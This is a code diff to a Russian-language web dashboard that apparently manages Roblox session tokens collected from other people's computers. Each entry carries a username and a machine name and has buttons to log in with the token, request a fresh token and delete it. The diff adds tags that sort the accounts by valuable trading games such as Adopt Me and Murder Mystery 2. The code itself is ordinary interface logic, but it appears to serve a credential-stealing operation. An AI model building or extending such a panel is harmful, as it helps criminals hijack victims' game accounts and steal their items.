@@ -7,6 +7,19 @@ bindLogout();
 let allTokens = [];
 let sortMode = 'date';
 
+const GAME_CATEGORIES = [
+  { id: 'mm2', name: 'Murder Mystery 2', icon: '🔪', color: '#ef4444' },
+  { id: 'adopt_me', name: 'Adopt Me', icon: '🐾', color: '#f59e0b' },
+  { id: 'steal_brainrot', name: 'Steal a Brainrot', icon: '🧠', color: '#a855f7' }
+];
+
+// Close bookmark dropdowns when clicking outside
+document.addEventListener('click', function(e) {
+  if (!e.target.closest('.bookmark-btn-wrap')) {
+    document.querySelectorAll('.bookmark-dropdown').forEach(d => d.remove());
+  }
+});
+
 async function loadTokens() {
   const container = document.getElementById('tokensContainer');
   const skeletonCard = `
@@ -118,6 +131,19 @@ function renderTokens() {
     html += '<div class="token-card-name">' + escapeHtml(t.username || '—') + '</div>';
     html += '<div class="token-card-computer">💻 ' + escapeHtml(t.computer || '—') + '</div>';
     
+    // Bookmark badges
+    const bookmarks = t.bookmarks || [];
+    if (bookmarks.length > 0) {
+      html += '<div class="bookmark-badges">';
+      for (const bm of bookmarks) {
+        const bmCat = GAME_CATEGORIES.find(c => c.id === bm);
+        if (bmCat) {
+          html += '<span class="bookmark-badge" style="background:' + bmCat.color + '15; color:' + bmCat.color + '; border-color:' + bmCat.color + '30;">' + bmCat.icon + ' ' + bmCat.name + '</span>';
+        }
+      }
+      html += '</div>';
+    }
+    
     html += '<div class="token-card-actions">';
     
     let loginBtnText = 'Войти';
@@ -133,6 +159,10 @@ function renderTokens() {
       html += '<div style="display:flex; gap:8px;">';
       html += '<button class="' + loginClass + '" style="flex:1;" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">' + loginBtnText + '</button>';
       html += '<button class="btn-secondary" title="Запросить новый токен" style="width:auto; padding:0 12px; border-color: rgba(0, 240, 255, 0.3); color: var(--accent); background: rgba(0, 240, 255, 0.05);" onclick="requestToken(\'' + fileId.replace(/'/g, "\\'") + '\')">📡</button>';
+      html += '<div class="bookmark-btn-wrap" style="position:relative;">';
+      const hasBookmarks = bookmarks.length > 0;
+      html += '<button class="btn-secondary bookmark-btn' + (hasBookmarks ? ' bookmarked' : '') + '" title="Пометить" style="width:auto; padding:0 12px; border-color: rgba(255, 183, 0, 0.3); color: ' + (hasBookmarks ? '#ffd60a' : 'var(--text-secondary)') + '; background: rgba(255, 183, 0, 0.05);" onclick="toggleBookmarkDropdown(event, \'' + fileId.replace(/'/g, "\\'") + '\')">🏷️</button>';
+      html += '</div>';
       html += '<button class="btn-secondary" title="Удалить токен" style="width:auto; padding:0 12px; border-color: rgba(255, 0, 85, 0.3); color: var(--danger); background: rgba(255, 0, 85, 0.05);" onclick="deleteToken(\'' + fileId.replace(/'/g, "\\'") + '\')">🗑️</button>';
       html += '</div>';
     } else {
@@ -346,3 +376,58 @@ async function deleteToken(fileId) {
     if (e.message !== 'auth') toast('Ошибка соединения', 'err');
   }
 }
+
+// ── Пометки ───────────────────────────────────────────────────────────────────
+function toggleBookmarkDropdown(event, fileId) {
+  event.stopPropagation();
+  // Remove any existing dropdowns
+  document.querySelectorAll('.bookmark-dropdown').forEach(d => d.remove());
+
+  const token = allTokens.find(t => t.file === fileId);
+  const bookmarks = (token && token.bookmarks) ? token.bookmarks : [];
+  const wrap = event.target.closest('.bookmark-btn-wrap');
+
+  const dropdown = document.createElement('div');
+  dropdown.className = 'bookmark-dropdown';
+  dropdown.onclick = function(e) { e.stopPropagation(); };
+
+  let html = '<div class="bookmark-dropdown-title">Пометить игру</div>';
+  for (const cat of GAME_CATEGORIES) {
+    const isChecked = bookmarks.includes(cat.id);
+    html += '<label class="bookmark-dropdown-item" style="--cat-color:' + cat.color + ';">';
+    html += '<input type="checkbox" ' + (isChecked ? 'checked' : '') + ' onchange="toggleBookmark(\'' + fileId.replace(/'/g, "\\'") + '\', \'' + cat.id + '\')">';
+    html += '<span class="bookmark-dropdown-icon">' + cat.icon + '</span>';
+    html += '<span>' + cat.name + '</span>';
+    html += '</label>';
+  }
+  dropdown.innerHTML = html;
+  wrap.appendChild(dropdown);
+}
+
+async function toggleBookmark(fileId, game) {
+  try {
+    const r = await apiFetch('/api/bookmark', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ filename: fileId, game: game })
+    });
+    const data = await r.json();
+    // Update local data
+    const token = allTokens.find(t => t.file === fileId);
+    if (token) {
+      token.bookmarks = data.bookmarks || [];
+    }
+    // Close dropdown and re-render
+    document.querySelectorAll('.bookmark-dropdown').forEach(d => d.remove());
+    renderTokens();
+    const cat = GAME_CATEGORIES.find(c => c.id === game);
+    if (data.bookmarks && data.bookmarks.includes(game)) {
+      toast('🏷️ Помечено: ' + (cat ? cat.name : game));
+    } else {
+      toast('🏷️ Пометка снята: ' + (cat ? cat.name : game));
+    }
+  } catch (e) {
+    if (e.message !== 'auth') toast('Ошибка', 'err');
+  }
+}
+
